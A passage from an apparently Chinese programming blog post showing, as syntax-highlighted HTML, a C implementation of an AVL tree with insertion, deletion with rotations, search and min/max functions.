**node)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private functions</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ADT_AVLTREE_AVLTREE_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源文件<code>AVLTree.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/9.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AVLTree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">AVLTree *<span class="title function_">AVLTreeCreate</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    AVLTree *tree = (AVLTree *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLTree));</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tree-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    tree-&gt;size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroyRun</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLTreeDestroyRun(node-&gt;left);</span><br><span class="line">    AVLTreeDestroyRun(node-&gt;right);</span><br><span class="line">    <span class="built_in">free</span>(node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AVLTreeDestroy</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// recursive destroy</span></span><br><span class="line">    AVLTreeDestroyRun(tree-&gt;root);</span><br><span class="line">    <span class="built_in">free</span>(tree);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// insert and delete</span></span><br><span class="line">status <span class="title function_">AVLTreeInsert</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    status result = AVLTreeInsertRun(&amp;tree-&gt;root, data);</span><br><span class="line">    <span class="comment">// check status</span></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">true</span>) &#123;</span><br><span class="line">        tree-&gt;size++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * insert data into AVLTree</span></span><br><span class="line"><span class="comment"> * return true if insert successfully</span></span><br><span class="line"><span class="comment"> * return false if insert failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">status <span class="title function_">AVLTreeInsertRun</span><span class="params">(AVLNode **root, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *root = (AVLNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(AVLNode));</span><br><span class="line">        <span class="keyword">if</span> (*root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;malloc failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line">        &#125;</span><br><span class="line">        (*root)-&gt;data = data;</span><br><span class="line">        (*root)-&gt;height = <span class="number">1</span>;</span><br><span class="line">        (*root)-&gt;left = (*root)-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*root)-&gt;data == data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;data &lt; data) &#123;</span><br><span class="line">        <span class="comment">// insert into right subtree</span></span><br><span class="line">        status result = AVLTreeInsertRun(&amp;(*root)-&gt;right, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after insert, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we insert into right subtree,</span></span><br><span class="line">        <span class="comment">// so rightHeight &gt;= leftHeight</span></span><br><span class="line">        <span class="keyword">if</span> (rightHeight - leftHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*root)-&gt;right-&gt;data &lt; data) &#123;</span><br><span class="line">                <span class="comment">// type RR</span></span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type RL</span></span><br><span class="line">                RightRotation(&amp;(*root)-&gt;right);</span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// insert into left subtree</span></span><br><span class="line">        status result = AVLTreeInsertRun(&amp;(*root)-&gt;left, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after insert, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we insert into left subtree,</span></span><br><span class="line">        <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">        <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*root)-&gt;left-&gt;data &gt; data) &#123;</span><br><span class="line">                <span class="comment">// type LL</span></span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type LR</span></span><br><span class="line">                LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// update height if abs(leftHeight - rightHeight) != 2</span></span><br><span class="line">    (*root)-&gt;height =</span><br><span class="line">            max(GetNodeHeight((*root)-&gt;left), GetNodeHeight((*root)-&gt;right)) +</span><br><span class="line">            <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeDelete</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    status result = AVLTreeDeleteRun(&amp;tree-&gt;root, data);</span><br><span class="line">    <span class="comment">// check status</span></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">true</span>) &#123;</span><br><span class="line">        tree-&gt;size--;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeDeleteRun</span><span class="params">(AVLNode **root, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ((*root)-&gt;data == data) &#123;</span><br><span class="line">        <span class="comment">// find the node</span></span><br><span class="line">        <span class="keyword">if</span> ((*root)-&gt;left != <span class="literal">NULL</span> &amp;&amp; (*root)-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// left and right subtree both exist</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// find the min node in right subtree and replace the node</span></span><br><span class="line">            ElementType key = GetNodeMin((*root)-&gt;right);</span><br><span class="line">            (*root)-&gt;data = key;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// delete the min node in right subtree</span></span><br><span class="line">            <span class="comment">// In effect, the question is shifted to deleting the min node in right subtree</span></span><br><span class="line">            AVLTreeDeleteRun(&amp;(*root)-&gt;right, key);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">            <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">            <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">            <span class="comment">// in this case, we delete the min node in right subtree,</span></span><br><span class="line">            <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">            <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">                <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;left-&gt;left) &gt;=</span><br><span class="line">                    GetNodeHeight((*root)-&gt;left-&gt;right)) &#123;</span><br><span class="line">                    <span class="comment">// type LL</span></span><br><span class="line">                    RightRotation(root);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// type LR</span></span><br><span class="line">                    LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                    RightRotation(root);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// left subtree is empty</span></span><br><span class="line">            AVLNode *temp = *root;</span><br><span class="line">            *root = (*root)-&gt;right;</span><br><span class="line">            <span class="built_in">free</span>(temp);</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// right subtree is empty</span></span><br><span class="line">            AVLNode *temp = *root;</span><br><span class="line">            *root = (*root)-&gt;left;</span><br><span class="line">            <span class="built_in">free</span>(temp);</span><br><span class="line">            temp = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*root)-&gt;data &lt; data) &#123;</span><br><span class="line">        <span class="comment">// find in right subtree</span></span><br><span class="line">        status result = AVLTreeDeleteRun(&amp;(*root)-&gt;right, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we delete in right subtree,</span></span><br><span class="line">        <span class="comment">// so leftHeight &gt;= rightHeight</span></span><br><span class="line">        <span class="keyword">if</span> (leftHeight - rightHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">            <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;left-&gt;left) &gt;=</span><br><span class="line">                GetNodeHeight((*root)-&gt;left-&gt;right)) &#123;</span><br><span class="line">                <span class="comment">// type LL</span></span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type LR</span></span><br><span class="line">                LeftRotation(&amp;(*root)-&gt;left);</span><br><span class="line">                RightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// find in left subtree</span></span><br><span class="line">        status result = AVLTreeDeleteRun(&amp;(*root)-&gt;left, data);</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (result == error)</span><br><span class="line">            <span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftHeight = GetNodeHeight((*root)-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightHeight = GetNodeHeight((*root)-&gt;right);</span><br><span class="line">        <span class="comment">// after delete, we need check if the tree is balanced</span></span><br><span class="line">        <span class="comment">// in this case, we delete in left subtree,</span></span><br><span class="line">        <span class="comment">// so rightHeight &gt;= leftHeight</span></span><br><span class="line">        <span class="keyword">if</span> (rightHeight - leftHeight == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// check &gt;= , not &gt;</span></span><br><span class="line">            <span class="keyword">if</span> (GetNodeHeight((*root)-&gt;right-&gt;right) &gt;=</span><br><span class="line">                GetNodeHeight((*root)-&gt;right-&gt;left)) &#123;</span><br><span class="line">                <span class="comment">// type RR</span></span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// type RL</span></span><br><span class="line">                RightRotation(&amp;(*root)-&gt;right);</span><br><span class="line">                LeftRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update height if abs(leftHeight - rightHeight) != 2 (?)</span></span><br><span class="line">    (*root)-&gt;height =</span><br><span class="line">            max(GetNodeHeight((*root)-&gt;left), GetNodeHeight((*root)-&gt;right)) +</span><br><span class="line">            <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search</span></span><br><span class="line">status <span class="title function_">AVLTreeSearch</span><span class="params">(AVLTree *tree, ElementType data)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;data == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;data &gt; data) &#123;</span><br><span class="line">            node = node-&gt;left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = node-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get max and min</span></span><br><span class="line">status <span class="title function_">AVLTreeGetMax</span><span class="params">(AVLTree *tree, ElementType *result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    *result = node-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeGetMin</span><span class="params">(AVLTree *tree, ElementType *result)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tree is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    AVLNode *node = tree-&gt;root;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    *result = node-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get status</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetHeight</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree-&gt;root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;root-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetNodeHeight</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">GetNodeMax</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> 